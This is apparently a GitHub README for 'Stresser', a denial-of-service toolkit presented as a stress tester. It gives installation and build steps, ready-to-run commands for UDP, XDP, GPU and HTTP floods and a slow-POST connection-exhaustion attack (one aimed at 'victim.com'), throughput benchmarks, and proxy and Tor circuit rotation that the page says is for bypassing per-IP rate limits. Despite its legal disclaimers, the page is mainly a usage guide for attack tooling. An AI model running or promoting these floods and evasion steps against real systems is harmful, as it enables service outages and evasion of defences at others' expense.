



# ⚡ Stresser – Advanced Network Stress Testing Tool

Stresser is a modular, high‑performance network stress testing framework with CPU, GPU, and kernel‑bypass attack engines. It supports multiple attack vectors including volumetric UDP floods (Python, Rust, XDP, GPU), HTTP/HTTPS floods (sync, async, Rust), slowloris‑style connection exhaustion, and proxy rotation with Tor circuit switching.

> **⚠️ LEGAL WARNING**  
> This tool is intended **solely** for authorized security assessments, stress testing your own infrastructure, or educational purposes in isolated lab environments.  
> **Unauthorized use against third‑party systems is illegal** and may result in criminal prosecution.  
> The developer assumes **no liability** for misuse.

---

## ✨ Features

| Attack Method | Engine | Max Throughput (single machine) |
|---------------|--------|--------------------------------|
| **UDP Flood** | Python | 85,000+ PPS |
| **XDP UDP Flood** | Rust + AF_PACKET | 500,000+ PPS |
| **GPU UDP Flood** | Rust + CUDA | 300,000+ PPS (multi‑threaded) |
| **HTTP Flood (sync)** | Python `requests` | ~150 RPS |
| **HTTP Flood (async)** | Python `aiohttp` | 2,000–20,000+ RPS |
| **HTTP Flood (Rust)** | Rust + `reqwest` | 500,000+ RPS |
| **R.U.D.Y.** | Python | Connection exhaustion |
| **Proxy Support** | HTTP, HTTPS, SOCKS4, SOCKS5 | Rotation & Tor circuit switching |
| **Real‑time Stats** | Live PPS, total requests, bandwidth, progress bar |
| **JSON Output** | Export metrics for integration with monitoring dashboards |
| **Rate Limiting** | Cap requests per second globally (optional) |

---

## 📦 Installation

### Requirements
- **Python** 3.8+
- **Linux** (recommended) or macOS
- **Root / sudo** privileges for UDP, XDP, and GPU attacks
- **NVIDIA GPU + CUDA Toolkit 12+** (for GPU attack)
- **Rust** (for XDP, Rust HTTP, and GPU engines)

### 1. Clone the Repository
```bash
git clone https://github.com/kaxm23/stresser.git
cd stresser
```

### 2. Create a Virtual Environment (Recommended)
```
python3 -m venv venv
source venv/bin/activate
```

### 3. Install Python Dependencies
```
pip install -r requirements.txt
```

**Optional – For SOCKS proxy support:**
```
pip install requests[socks]
```

**Optional – For Tor circuit rotation (requires `stem`):**
```
pip install stem
```

### 4. Build Rust Engines (XDP, Rust HTTP, GPU)

```
# Build XDP engine
cd rust_xdp
cargo build --release
cp target/release/librust_xdp.so ../core/rust_xdp.so

# Build Rust HTTP engine
cd ../rust_http
cargo build --release
cp target/release/librust_http.so ../core/rust_http.so

# Build GPU engine (requires CUDA)
cd ../gpu_streamer
cargo build --release
cp target/release/libgpu_streamer.so ../core/gpu_streamer.so
cd ..
```

---

## 🚀 Quick Start

### Basic UDP Flood (Python)
```
sudo python3 cli.py --method udp --target 192.168.1.100 --port 80 --threads 32 --duration 10
```

### XDP UDP Flood (Rust – 500k+ PPS)
```
sudo python3 cli.py --method xdp --target 192.168.1.100 --port 80 --duration 10 --interface eth0
```

### GPU UDP Flood (CUDA – 300k+ PPS)
```
sudo python3 cli.py --method gpu --target 192.168.1.100 --port 80 --duration 10 --num-packets 4000000 --send-threads 32
```

### Rust HTTP Flood (millions RPS)
```
sudo python3 cli.py --method http-rust --target example.com --port 80 --duration 10 --concurrency 2000
```

### Async HTTP Flood with Proxies
```
python3 cli.py --method http-async --target example.com --port 80 --threads 20 --proxy-file proxies.txt --duration 30
```

### R.U.D.Y. Slowloris‑style Attack
```
python3 cli.py --method rudy --target victim.com --port 80 --threads 10 --duration 300
```

---

## 📖 

```
usage: cli.py [-h] --method {udp,http,rudy,http-async,xdp,http-rust,gpu}
              --target HOST [--port PORT] [--threads N] [--duration SEC]
              [--rps N] [--proxy-file PATH] [--json] [--payload-size BYTES]
              [--path PATH] [--interface INTERFACE] [--concurrency CONCURRENCY]
              [--disable-pooling] [--num-packets NUM_PACKETS]
              [--send-threads SEND_THREADS]

Advanced stress testing tool

required arguments:
  --method {udp,http,rudy,http-async,xdp,http-rust,gpu}
                        Attack method

optional arguments:
  --target HOST         Target IP or domain (without http://)
  --port PORT           Target port (default: 80)
  --threads N           Number of OS threads (default: 32)
  --duration SEC        Attack duration in seconds (default: 60)
  --rps N               Max requests per second (0 = unlimited)
  --proxy-file PATH     File containing proxies (one per line)
  --json                Output stats as JSON lines (for logging)
  --payload-size BYTES  UDP payload size in bytes (default: 1024)
  --path PATH           HTTP path to request (default: "/")
  --interface INTERFACE Network interface for XDP attack (default: eth0)
  --concurrency CONCURRENCY
                        Concurrent connections for Rust HTTP flood (default: 1000)
  --disable-pooling     Disable HTTP connection pooling (Rust HTTP)
  --num-packets NUM_PACKETS
                        Number of packets to pre-generate on GPU (default: 2000000)
  --send-threads SEND_THREADS
                        Number of threads for GPU UDP sending (default: 8)
```

---

## 🌐 Proxy Configuration

Create a text file (e.g., `proxies.txt`) with one proxy per line.  
Supported formats:

```
http://user:pass@192.168.1.100:8080
https://proxy.example.com:3128
socks5://127.0.0.1:9050
socks4://10.0.0.1:1080
```

### Testing Proxies
Use the included fast proxy tester to filter out dead entries:
```bash
python3 test_proxies_fast.py proxies.txt
```
Working proxies will be saved to `working_proxies.txt`.

---

## 🧅 Tor Integration (Circuit Rotation)

To bypass per‑IP rate limits using Tor:

1. **Install and configure Tor:**
   ```bash
   sudo apt install tor
   sudo systemctl start tor
   ```

2. **Enable the control port** in `/etc/tor/torrc`:
   ```
   ControlPort 9051
   CookieAuthentication 1
   ```
   Restart Tor: `sudo systemctl restart tor`

3. **Add your user to the Tor group** (for cookie auth):
   ```
   sudo usermod -a -G debian-tor $USER
   newgrp debian-tor
   ```

4. **Create `proxies.txt` with:**
   ```
   socks5://127.0.0.1:9050
   ```

5. **Run an attack.** The `http-async` method will automatically rotate the Tor circuit every 50 requests (configurable in code).

---

## 📁 Project Structure

```
stresser/
├── attacks/
│   ├── __init__.py
│   ├── base.py           # Abstract attack base class
│   ├── udp.py            # Python UDP flood
│   ├── xdp_udp.py        # Rust XDP UDP flood
│   ├── gpu_udp.py        # GPU-accelerated UDP flood
│   ├── http.py           # Synchronous HTTP flood
│   ├── http_async.py     # Asynchronous HTTP flood (high RPS)
│   ├── http_rust.py      # Rust HTTP flood (millions RPS)
│   └── rudy.py           # R.U.D.Y. slow POST attack
├── core/
│   ├── __init__.py
│   ├── proxy.py          # Proxy manager with Tor rotation
│   ├── stats.py          # Real‑time statistics monitor
│   ├── xdp_engine.py     # Python wrapper for Rust XDP
│   ├── http_rust_engine.py # Python wrapper for Rust HTTP
│   ├── gpu_engine.py     # Python wrapper for GPU engine
│   └── *.so              # Compiled Rust libraries
├── rust_xdp/             # Rust XDP source (AF_PACKET)
├── rust_http/            # Rust HTTP source (reqwest)
├── gpu_streamer/         # Rust GPU source (CUDA)
├── cli.py                # Command‑line entry point
├── test_proxies_fast.py  # Multi‑threaded proxy tester
├── requirements.txt
└── README.md
```

---

## 📈 Performance Benchmarks

| Method | Configuration | Performance (single machine) |
|--------|---------------|------------------------------|
| **UDP (Python)** | 100 threads, 1400‑byte payload | **85,000+ PPS** |
| **XDP (Rust)** | AF_PACKET, 1 thread | **530,000+ PPS** |
| **GPU (CUDA)** | 32 send threads, 4M pre‑generated packets | **300,000+ PPS** |
| **HTTP (async)** | 20 threads, 1 Tor proxy | **2,000–3,000 RPS** |
| **HTTP (Rust)** | 2000 concurrency, HTTP/2 | **500,000+ RPS** |
| **R.U.D.Y.** | 10 threads, 50 sockets/thread | Exhausts connections |

*Actual results depend on network, target server, and system limits.*

---

## 🛡️ Legal & Ethical Use

- Only test systems **you own** or have **explicit written permission** to test.
- Unauthorized DDoS attacks are a criminal offense in most jurisdictions (e.g., Computer Fraud and Abuse Act in the US, Computer Misuse Act in the UK).
- The developer is **not responsible** for any misuse or damage caused by this tool.

By using this software, you agree to assume **full legal and ethical responsibility** for your actions.

---

## 📜 License

This project is licensed under the **MIT License**. See the `LICENSE` file for details.

---

## 🤝 Contributing

Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

---

## 📧 Contact

For questions or authorized testing inquiries, open an issue on GitHub.

---

**Stay ethical. Test responsibly.**
